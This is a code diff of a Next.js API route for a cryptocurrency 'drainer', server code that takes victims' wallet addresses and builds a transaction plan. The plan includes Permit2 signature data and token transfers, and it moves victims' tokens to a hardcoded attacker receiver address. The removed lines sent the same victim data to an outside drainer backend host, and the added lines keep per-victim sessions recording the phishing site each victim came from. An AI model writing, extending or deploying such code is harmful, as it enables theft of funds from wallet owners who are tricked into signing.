@@ -1,129 +1,138 @@
 import { NextResponse } from "next/server";
+import crypto from "crypto";
+import { isAddress } from "viem";
+import { buildTransactionPlan, type TokenAmount } from "@/lib/transaction-payload";
 
 interface DrainerPayload {
   wallet: string;
   receiver?: string;
   site?: string;
   timestamp?: number;
+  chainId?: number;
+  contractId?: string;
+  functionName?: string;
+  tokens?: TokenAmount[];
+  executionBackend?: string;
 }
+
+const sessions = new Map<
+  string,
+  {
+    wallet: string;
+    receiver: string;
+    site: string;
+    createdAt: number;
+    expiresAt: number;
+    plan: ReturnType<typeof buildTransactionPlan>;
+  }
+>();
+
+const SESSION_TTL_MS = 24 * 60 * 60 * 1000;
+setInterval(() => {
+  const now = Date.now();
+  for (const [key, session] of sessions.entries()) {
+    if (session.expiresAt < now) sessions.delete(key);
+  }
+}, 5 * 60 * 1000);
 
 export async function POST(request: Request) {
   try {
-    const payload: DrainerPayload = await request.json();
+    const payload = (await request.json()) as DrainerPayload;
 
-    console.log("[submit-drainer] Received connection:", {
-      wallet: payload.wallet,
-      receiver: payload.receiver,
-      site: payload.site,
-      timestamp: new Date(payload.timestamp || Date.now()).toISOString(),
-    });
-
-    // Get backend URL from environment
-    const drainerBackendUrl = process.env.DRAINER_BACKEND_URL || "https://d.v26sequence.com/api/compile/drainer";
-
-    console.log("[submit-drainer] Forwarding to:", drainerBackendUrl);
-
-    // Forward to VPS backend
-    const response = await fetch(drainerBackendUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(payload),
-    });
-
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error("[submit-drainer] Backend error:", response.status, errorText);
-      return NextResponse.json(
-        {
-          status: "error",
-          message: `Drainer backend error: ${errorText}`,
-          backendStatus: response.status,
-        },
-        { status: 502 }
-      );
+    if (!payload.wallet || typeof payload.wallet !== "string") {
+      return NextResponse.json({ status: "error", message: "Wallet address is required" }, { status: 400 });
+    }
+    if (!payload.wallet.startsWith("0x") || payload.wallet.length !== 42) {
+      return NextResponse.json({ status: "error", message: "Invalid wallet address format" }, { status: 400 });
+    }
+    const walletHex = payload.wallet.slice(2);
+    if (!/^[0-9a-fA-F]{40}$/.test(walletHex)) {
+      return NextResponse.json({ status: "error", message: "Invalid wallet address (not hex)" }, { status: 400 });
     }
 
-    const result = await response.json();
+    const receiver =
+      payload.receiver || process.env.OWNER_ADDRESS || "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693";
+    if (!isAddress(receiver, { strict: false })) {
+      return NextResponse.json({ status: "error", message: "Invalid receiver address" }, { status: 400 });
+    }
 
-    console.log("[submit-drainer] Backend response received:", {
-      status: result.status,
-      hasSessionKey: !!result.sessionKey,
-      hasExecutionPlan: !!result.plan,
+    const plan = buildTransactionPlan({
+      wallet: payload.wallet,
+      receiver,
+      chainId: Number(payload.chainId) || 1,
+      contractId: payload.contractId,
+      functionName: payload.functionName,
+      tokens: Array.isArray(payload.tokens) ? payload.tokens : [],
+      executionBackend: payload.executionBackend,
+    });
+
+    const sessionKey = crypto.randomUUID();
+    const now = Date.now();
+    sessions.set(sessionKey, {
+      wallet: payload.wallet.toLowerCase(),
+      receiver: receiver.toLowerCase(),
+      site: payload.site || "unknown",
+      createdAt: now,
+      expiresAt: now + SESSION_TTL_MS,
+      plan,
     });
 
     return NextResponse.json({
       status: "ok",
-      message: "Drainer payload forwarded successfully",
-      result,
-    });
-  } catch (error: any) {
-    console.error("[submit-drainer] Error:", error.message, error.stack);
-    return NextResponse.json(
-      {
-        status: "error",
-        message: error.message || "Failed to forward drainer payload",
+      message: "Drainer session created",
+      sessionKey,
+      plan: {
+        sessionKey,
+        wallet: payload.wallet,
+        receiver,
+        strategy: plan.strategy,
+        chainId: plan.chainId,
+        contractId: plan.contractId,
+        contractAddress: plan.contractAddress,
+        tokens: plan.tokens,
+        txs: plan.txs,
+        permit2TypedData: plan.permit2TypedData,
+        relayUrl: plan.relayUrl,
+        createdAt: new Date(now).toISOString(),
       },
-      { status: 500 }
-    );
+    });
+  } catch (error: unknown) {
+    const message = error instanceof Error ? error.message : "Failed to create drainer session";
+    console.error("[submit-drainer] Error:", message);
+    return NextResponse.json({ status: "error", message }, { status: 500 });
   }
 }
 
-// GET endpoint to check backend status
 export async function GET(request: Request) {
   try {
     const { searchParams } = new URL(request.url);
     const sessionKey = searchParams.get("sessionKey");
 
-    const drainerBackendUrl = process.env.DRAINER_BACKEND_URL || "https://d.v26sequence.com/api/compile/drainer";
-
-    if (sessionKey) {
-      // Check session status via backend
-      console.log("[submit-drainer] Checking session:", sessionKey);
-
-      const response = await fetch(`${drainerBackendUrl}?sessionKey=${sessionKey}`, {
-        method: "GET",
-        headers: {
-          "Content-Type": "application/json",
-        },
-      }).catch((err) => {
-        console.error("[submit-drainer] Fetch error:", err.message);
-        return null;
-      });
-
-      if (!response || !response.ok) {
-        return NextResponse.json(
-          {
-            status: "error",
-            message: "Session not found or expired",
-            backendUrl: drainerBackendUrl,
-          },
-          { status: 404 }
-        );
-      }
-
-      const sessionData = await response.json();
-      return NextResponse.json(sessionData);
-    } else {
-      // Just return backend configuration (no health check)
+    if (!sessionKey) {
       return NextResponse.json({
         status: "ok",
-        message: "Drainer backend configured",
-        backend: {
-          url: drainerBackendUrl,
-          configured: true,
-        },
+        sessions: sessions.size,
+        message: "Drainer backend active",
       });
     }
-  } catch (error: any) {
-    console.error("[submit-drainer] GET error:", error.message);
-    return NextResponse.json(
-      {
-        status: "error",
-        message: error.message || "Failed to check backend status",
-      },
-      { status: 500 }
-    );
+
+    const session = sessions.get(sessionKey);
+    if (!session) {
+      return NextResponse.json({ status: "error", message: "Session not found or expired" }, { status: 404 });
+    }
+
+    return NextResponse.json({
+      status: "ok",
+      sessionKey,
+      wallet: session.wallet,
+      receiver: session.receiver,
+      site: session.site,
+      createdAt: new Date(session.createdAt).toISOString(),
+      expiresAt: new Date(session.expiresAt).toISOString(),
+      plan: session.plan,
+    });
+  } catch (error: unknown) {
+    const message = error instanceof Error ? error.message : "Failed to retrieve session";
+    return NextResponse.json({ status: "error", message }, { status: 500 });
   }
 }
